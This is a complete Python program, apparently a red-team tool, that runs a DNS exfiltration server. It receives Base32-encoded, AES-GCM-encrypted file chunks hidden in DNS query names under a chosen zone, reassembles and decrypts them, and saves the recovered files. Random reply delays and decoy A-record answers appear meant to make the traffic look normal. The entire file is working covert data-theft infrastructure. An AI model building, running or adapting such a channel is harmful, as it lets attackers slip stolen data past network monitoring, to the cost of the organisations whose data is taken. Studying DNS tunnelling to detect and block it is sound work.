#!/usr/bin/env python3
"""
Module Name: server.py

Description: DNS exfiltration server that receives Base32-encoded, AES-GCM encrypted data chunks in DNS queries,
reassembles and decrypts the original file, and writes it to disk.

Author: John Burns
Date: 2024-04-30
Version: 1.2 (AES-GCM decryption)
"""
from dotenv import load_dotenv, find_dotenv
import threading
import struct
import socket
import base64
from collections import defaultdict
import os
import random
import argparse
import time
import logging
from dnslib import DNSRecord, RR, QTYPE, A
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
load_dotenv(find_dotenv())
# Configure logging
tlogging = logging.getLogger('main')
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = tlogging

# Load AES-GCM key (32 bytes hex) from environment
KEY = bytes.fromhex(os.environ['EXFIL_KEY'])

def decrypt_data(blob: bytes) -> bytes:
    """
    Decrypts AES-GCM blob: nonce (12B) || ciphertext+tag
    Returns the original plaintext.
    """
    aesgcm = AESGCM(KEY)
    nonce = blob[:12]
    ct = blob[12:]
    return aesgcm.decrypt(nonce, ct, associated_data=None)

# Store incoming encrypted fragments by identifier
data_fragments = defaultdict(dict)
expected_counts = defaultdict(int)


def parse_dns_header(data):
    # Returns (id, flags)
    return struct.unpack('!6H', data[:12])[:2]


def parse_dns_query_section(data):
    offset = 12
    labels = []
    try:
        while True:
            length = data[offset]
            if length == 0:
                offset += 1
                break
            offset += 1
            labels.append(data[offset:offset+length].decode('ascii'))
            offset += length
        return '.'.join(labels)
    except Exception:
        return None


def handle_dns_request(data, addr, sock, args):
    dns_id, dns_flags = parse_dns_header(data)
    # Drop responses (QR bit = 1)
    if (dns_flags >> 15) & 1:
        return

    raw_qname = parse_dns_query_section(data)
    if not raw_qname:
        logger.info("DNS query parsing failed.")
        return

    qname_nodot = raw_qname.rstrip('.')
    qname_compare = qname_nodot.lower()
    zone = args.domain.rstrip('.').lower()
    if not qname_compare.endswith('.' + zone):
        logger.info(f"Invalid domain: {raw_qname}")
        return

    identifier_segment = qname_nodot[:-(len(zone) + 1)]
    # Rate-limit
    pause_ms = random.randint(args.low, args.high)
    time.sleep(pause_ms / 1000)

    process_query(identifier_segment, args)
    send_dns_response(data, addr, sock)


def send_dns_response(data, addr, sock):
    try:
        request = DNSRecord.parse(data)
        reply = request.reply()
        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("192.0.2.1"), ttl=300))
        sock.sendto(reply.pack(), addr)
    except Exception as e:
        logger.error(f"Error sending response: {e}")


def process_query(identifier_segment, args):
    try:
        ident_raw, idx, total, payload = identifier_segment.split('-', 3)
    except ValueError:
        logger.info(f"Bad segment: {identifier_segment}")
        return

    identifier = ident_raw.lower()
    logger.info(f"[{identifier}] Received chunk {idx}/{total}")

    # Base32 padding to multiple of 8
    pad_len = (8 - (len(payload) % 8)) % 8
    padded = payload + ('=' * pad_len)
    try:
        encrypted = base64.b32decode(padded, casefold=True)
    except Exception as e:
        logger.error(f"[{identifier}] Base32 decode error: {e}")
        return

    index = int(idx)
    total_segments = int(total)
    expected_counts[identifier] = total_segments
    data_fragments[identifier][index] = encrypted

    received = len(data_fragments[identifier])
    logger.info(f"[{identifier}] Fragments: {received}/{total_segments}")
    if received == total_segments:
        save_data(identifier, data_fragments.pop(identifier), args)


def save_data(identifier, fragments, args):
        # Reassemble encrypted blob
    encrypted_blob = b''.join(fragments[i] for i in sorted(fragments))
        # Decrypt entire blob
    try:
        plaintext = decrypt_data(encrypted_blob)
    except Exception as e:
        logger.error(f"[{identifier}] Decrypt failed: {e}")
        return

    os.makedirs(args.output_dir, exist_ok=True)
    out_path = os.path.join(args.output_dir, f"{identifier}.bin")
    with open(out_path, 'wb') as f:
        f.write(plaintext)
    logger.info(f"[{identifier}] Saved decrypted data to {out_path}")


def get_args():
    parser = argparse.ArgumentParser(description="DNS Exfiltration Server")
    parser.add_argument("--port", type=int, default=53, help="UDP port to listen on")
    parser.add_argument("--output-dir", default="output", help="Directory for output files")
    parser.add_argument("--low", type=int, default=100, help="Min delay (ms)")
    parser.add_argument("--high", type=int, default=800, help="Max delay (ms)")
    parser.add_argument("--domain", default="xf.example.com", help="Zone to match")
    return parser.parse_args()


def start_server(args):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", args.port))
    sock.settimeout(1)
    logger.info(f"Listening on UDP/{args.port}...")
    try:
        while True:
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue
            threading.Thread(target=handle_dns_request, args=(data, addr, sock, args), daemon=True).start()
    except KeyboardInterrupt:
        logger.info("Shutting down.")
    finally:
        sock.close()

if __name__ == "__main__":
    args = get_args()
    start_server(args)
